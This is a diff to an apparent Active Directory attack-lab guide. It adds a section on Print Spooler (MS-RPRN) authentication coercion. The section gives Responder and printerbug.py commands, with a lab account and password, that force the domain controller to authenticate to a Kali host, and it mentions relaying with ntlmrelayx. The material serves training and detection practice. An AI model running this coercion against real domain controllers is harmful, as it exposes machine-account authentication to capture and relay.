@@ -23,6 +23,7 @@ the domain controller is `10.<range>.20.11`, and the workstation is
 ```bash
 export DC_IP=10.<range>.20.11
 export WS_IP=10.<range>.20.21
+export KALI_IP=10.<range>.20.250
 ```
 
 Kali is configured to resolve the domain through the DC. The examples use the
@@ -128,6 +129,39 @@ additional directory permissions. Restart services or the affected Windows
 hosts if the registry policy changes have not taken effect.
 
 **References:** [Impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) · [The Hacker Recipes: NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
+
+## Authentication coercion (MS-RPRN)
+
+**What it is:** The Print Spooler exposes remote printer RPC methods that can
+induce a computer to authenticate to a tester-controlled host. This lab
+scenario is an intentional service-configuration weakness: it enables Print
+Spooler on the DC and creates the low-privilege `user.coercion` account needed
+to invoke the RPC method. It does not depend on exploiting a CVE.
+
+**From Kali:** start a capture or relay listener first, then trigger the DC to
+authenticate to Kali. With Responder listening on Kali's lab interface:
+
+```bash
+sudo responder -I eth0
+```
+
+In a second Kali terminal, run `printerbug.py` from
+[dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx):
+
+```bash
+python3 printerbug.py \
+  "THRUNTOPS/user.coercion:password1@${DC_IP}" \
+  "$KALI_IP"
+```
+
+The DC should attempt NTLM authentication to Kali; Responder should show the
+computer account (`THRUNTOPS$`) rather than `user.coercion`, because the
+Spooler service performs the outbound authentication. The machine-account
+secret is randomly managed by AD, so this exercise demonstrates coercion and
+telemetry, not a crackable password. For a relay exercise, replace Responder
+with an appropriate `ntlmrelayx` listener and use only targets inside this lab.
+
+**References:** [krbrelayx printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) · [The Hacker Recipes: MS-RPRN coercion and NTLM relay](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/rpc-coercions/ms-rprn)
 
 ## Detection and cleanup
 
